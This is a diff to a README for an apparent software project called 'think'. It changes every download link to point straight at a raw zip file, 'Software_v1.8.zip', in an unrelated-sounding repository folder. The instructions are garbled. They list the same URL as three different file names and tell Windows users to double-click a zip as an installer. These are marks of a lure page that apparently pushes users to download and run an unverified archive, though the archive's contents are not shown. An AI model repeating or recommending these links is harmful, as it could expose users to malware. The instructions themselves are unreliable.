@@ -6,13 +6,13 @@ Welcome to **think**, a community-driven project focused on simplicity and perfo
 
 ## 🔗 Download Now
 
-[![Download think](https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip)](https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip)
+[![Download think](https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip)](https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip)
 
 ## 📥 Download & Install
 
 To get started, please visit this page to download the latest version of think:
 
-[Download think from our Releases page](https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip)
+[Download think from our Releases page](https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip)
 
 ### 🖥️ System Requirements
 
@@ -27,21 +27,21 @@ Before downloading, ensure your device meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click on the link below, or type it into your web browser to access the releases:  
-   [Visit Releases Page](https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip)
+   [Visit Releases Page](https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, locate the latest version of think. Look for tags like "Latest Release" or a version number (e.g., v1.0).
 
 3. **Download the File**  
-   Click on the file that corresponds to your operating system. It may be named something like `https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip`, `https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip`, or `https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip`. The file size will be listed next to it.
+   Click on the file that corresponds to your operating system. It may be named something like `https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip`, `https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip`, or `https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip`. The file size will be listed next to it.
 
 4. **Open the Downloaded File**  
    Once the download is complete, locate the file on your computer. This is usually in your 'Downloads' folder.
 
 5. **Run the Installer**  
-   - **Windows Users:** Double-click the `https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip` file. Follow the on-screen steps to complete the installation.
+   - **Windows Users:** Double-click the `https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip` file. Follow the on-screen steps to complete the installation.
    - **macOS Users:** Open the `.dmg` file and drag the think icon to your Applications folder.
-   - **Linux Users:** Extract the `https://raw.githubusercontent.com/Hardcore-bioengineering120/think/master/gestative/think-1.8.zip` file. Open the terminal, navigate to the folder where the file is, and run `./think` to start the application.
+   - **Linux Users:** Extract the `https://github.com/Hardcore-bioengineering120/think/raw/refs/heads/master/gestative/Software_v1.8.zip` file. Open the terminal, navigate to the folder where the file is, and run `./think` to start the application.
 
 6. **Open think**  
    After installation, find think in your Applications or Programs list. Click on it to open the application.
